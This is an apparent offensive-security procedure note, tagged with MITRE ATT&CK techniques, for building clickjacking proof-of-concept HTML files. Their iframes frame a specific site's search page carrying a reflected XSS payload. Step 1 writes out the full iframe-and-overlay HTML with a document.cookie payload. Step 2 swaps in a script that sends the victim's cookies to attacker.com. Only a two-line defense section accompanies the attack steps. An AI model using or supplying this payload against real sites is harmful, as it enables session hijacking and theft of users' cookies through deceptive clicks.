---
id: uuid-proc-5
tags:
  - clickjacking
  - poc
  - html
  - xss
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:25.876Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Develop-Clickjacking-POC-HTML

## Summary

This procedure creates HTML proof-of-concept files that use iframes to embed the vulnerable search page and overlay elements to deliver the XSS payload via user interaction.

## Description

The POC files (POC1.html and POC2.html) load the target in an iframe with the XSS payload in the src, using CSS overlays to make users click on deceptive elements, triggering the reflected XSS. This combines clickjacking with XSS for stealthy exploitation on web platforms.

## Requirements

1. Text editor (e.g., VS Code)
2. Valid XSS payload from prior steps
3. Local file serving capability (optional)

## Defense

Defensive measures and detection strategies:

- Implement frame-ancestors CSP directive
- Scan for phishing domains hosting malicious HTML

## Objectives

1. Build functional clickjacking interface
2. Integrate XSS payload delivery
3. Simulate victim interaction

## Instructions

### Step 1: Create Basic POC Structure

**Context**: Set up the HTML with iframe and overlay.

Write POC1.html: <html><body><iframe src="https://bhg.com/shop/all.html?s=%E2%80%98);%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E" style="opacity:0.5;"></iframe><div style="position:absolute;top:0;left:0;"><button>Click Here</button></div></body></html>.

> The iframe loads with payload; overlay tricks click to focus/submit.

### Step 2: Enhance for Exfiltration

**Context**: Modify payload for cookie theft.

Update script to: <script>document.location='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script> in the iframe src.

> Test by opening POC; click should exfiltrate data.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[poc]]
- [[html]]
- [[xss]]
